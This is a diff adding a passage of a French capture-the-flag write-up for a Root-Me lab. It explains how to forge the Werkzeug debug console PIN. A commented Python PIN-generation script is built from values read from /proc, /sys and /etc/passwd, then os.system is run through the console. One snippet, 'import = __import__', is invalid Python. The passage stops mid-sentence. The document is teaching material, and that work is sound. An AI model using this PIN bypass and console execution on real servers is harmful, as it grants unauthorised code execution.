@@ -97,3 +97,184 @@ Bon continuons essayons de voir ou ce situe cette console de debug :
 Essayons de voir s'il est bien actif sur notre site pour cela je vais taper l'url suivante : 
 
 challenge01.root-me.org:59085/console
+![](../img/Pasted%20image%2020260425173423.png)
+
+(à noter que je suis sous un navigateur privé puisque j'avais déjà fais le challenge mes cookies été relier et skipper l'étape la plus importante qui est le crackage du pin de la console.)
+
+Mince il va falloir craquer le pin. Mais comment est constituer le pin de Werkzeug ? 
+
+Il est constituer de plusieurs choses, il n'est pas choisis aléatoirement ou par l'administrateur mais plutôt par les informations qui sont mises dans les différents fichier. Je vous ai fait lire plusieurs fichier puisqu'on avait besoin pour la suite vous allez vite le voir. Pour bypass le pin on peut utiliser le script suivant que j'ai commentais : 
+
+```python
+import hashlib
+
+from itertools import chain
+
+  
+
+def main() :
+
+    mac = int("02 42 ac 10 00 2a".replace(" ", ""), 16) #Trouver dans le fichier /proc/net/arp l'interface réseau utiliser puis aller dans /sys/class/net/[nom_de_votre_interface]/address ici le ,16 permet de convertir directement de l'hexa à décimale et .replace permet de remplacer les caractères " " par des caractères vides "".
+
+  
+  
+
+    public_bits = [
+
+        'web-app', #Le nom de l'utilisateur que vous pouvez retrouver dans /etc/passwd ou /proc/sys/environ par exemple ici j'ai /home/web-app je sais que c'est un utilisateur qui contient un répertoire utilisateur par le /home juste avant donc l'utilisateur est web-app
+
+        'flask.app', #modname par défaut car on à /flask/app.py donc on à le nom flask.app grossomodo. 
+
+        'Flask', # getattr(app '__name__', getattr(app.__class__, '__name__')) Le nom par défaut aussi pour flask
+
+        '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' #getattr(mod ,'__file__',None),
+
+  
+
+    ]
+
+  
+
+    private_bits = [
+
+        str(mac), #Je rappel ma variable mais ici on va travailler en str donc je transforme mon instance int en instance str
+
+        'f6a43d31-5709-47e5-a76f-205dcff3130f' #Trouver dans /proc/sys/kernel/random/boot_id
+
+  
+
+    ]
+
+  
+
+# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+
+    hash = hashlib.sha1()
+
+    for bit in chain(public_bits, private_bits): #Ici je concatène mes deux listes ce qui veut dire que les données publiques seront reliers au donnés privé
+
+        if not bit: #Si le bit est vide (None) on continue
+
+            continue
+
+        if isinstance(bit, str): #Si mon bit est de instance strings alors je le transforme en bit
+
+            bit = bit.encode('utf-8')
+
+        hash.update(bit)
+
+    hash.update(b'cookiesalt') #Le b devant signifie(bytes) et on ajoute le salt au hash sha1
+
+    # h.update(b'shittysalt')
+
+  
+
+    cookie_name = '__wzd' + hash.hexdigest()[:20] #__wzd est le début des cookies WerkZeug Debug que vous pouvez trouver  hash.hexdigest va permetre de hasher en hexadecimal (string) et le [:20 on ne prend que les 20 premier caractère] exemple : __wzdabc123456789...
+
+  
+
+    num = None
+
+    if num is None: #Si num n'est pas définie :
+
+        hash.update(b'pinsalt') #On ajoute un autre salt ici c'est le salt du pin
+
+        num = ('%09d' % int(hash.hexdigest(), 16))[:9] #hash.hexdigest (hash en hexa) ,int(... , 16) convertie en entier , %09d formate avec 9 chiffres minimum. [:9] garde seulement 9 chiffres
+
+  
+
+    rv = None
+
+    if rv is None:
+
+        for group_size in 5, 4, 3: #On découpe en groupe de 5 chiffres, 4 ou 3 ce qui donne soit 12345-67890 ou 1234-5678-9 ou soit 123-456-789
+
+            if len(num) % group_size == 0: #Si la taille du numéro diviser par le groupe donc en 5 en 4 ou en 3 le reste est 0 alors on forme notre pin
+
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+
+                            for x in range(0, len(num), group_size))
+
+                break
+
+        else:
+
+            rv = num
+
+  
+
+    print(rv)
+
+  
+
+if __name__ == "__main__" :
+
+    main()
+```
+
+
+J'ai expliquer la plus part du code et où on trouve les différentes informations qui faut. Dans les données que l'ont à déjà vu. Pour les informations privés je vais vous montrer où les cherchés. 
+
+L'adresse Mac il suffit d'aller voir les informations enregistrer sur le processus arp. On va aller voir /proc/net/arp : 
+
+![](../img/Pasted%20image%2020260425174858.png)
+Ici on voit notre interface. Maintenant nous allons récupérer l'adresses relier à cette interface qui est eth0 pour cela on va aller voir le fichier : /sys/class/net/eth0/address
+
+![](../img/Pasted%20image%2020260425175048.png)
+
+Okay parfait. 
+
+Remplacer les informations par celle que vous avez. Maintenant je vais lancer mon script : 
+
+![](../img/Pasted%20image%2020260425175203.png)
+![](../img/Pasted%20image%2020260425175211.png)
+
+Résultat du crackage du pin : 571-988-375
+Maintenant voyons voir si on à pris les bonnes informations en testant notre pin sur l'endpoint /console pour avoir accès à la console
+
+![](../img/Pasted%20image%2020260425175400.png)
+
+Moment de vérité : 
+
+![](../img/Pasted%20image%2020260425175417.png)
+
+Bingo ! 
+
+
+Maintenant il faut savoir que le debugger de Werkzeug utilise des commandes via python il n'est donc pas possible de taper comme de rien n'était cat ou ls -la par exemple, preuve de ce que j'avance : 
+
+![](../img/Pasted%20image%2020260425175533.png)
+
+
+Il faut pour cela on va utiliser le module (os) et on va l'importer dans notre shell sur la commande, car oui si vous voulez comme au début avec moi utiliser os.system() qui est censé quand même vous renvoyer une information celui-ci vous renverras juste que la commande c'est bien passer avec un "0" mais ne vous renverras pas l'informations de qui vous êtes. 
+
+Démonstration : 
+
+je vais taper la choses suivante dans mon shell : 
+
+```shell
+__import__("os").system("whoami")
+```
+Je rappel que puisque c'est un shell et qu'on veut importer le module os on ne vas pas taper comme du script normal donc import os mais avec la syntaxe juste au dessus. 
+```python
+import = __import__
+```
+
+Les deux fons la même choses mais ne sont pas utiliser dans le même contexte. 
+Le script que j'ai taper en une ligne reviens à taper la chose suivante : 
+
+```python
+import os 
+
+os.system("whoami")
+```
+
+Ceci va donc me dire qui je suis nan ? Et bein nan si vous vous rappelez de ce que je vous ai dis ici cela va nous renvoyer que 0 preuve : 
+
+![](../../Pasted%20image%2020260425180132.png)
+
+la commande c'est bien exécuté mais elle nous renvoie pas ce qu'on veut. 
+
+Donc on va utiliser quelque choses d'autre que .system 
+
+On va utiliser 
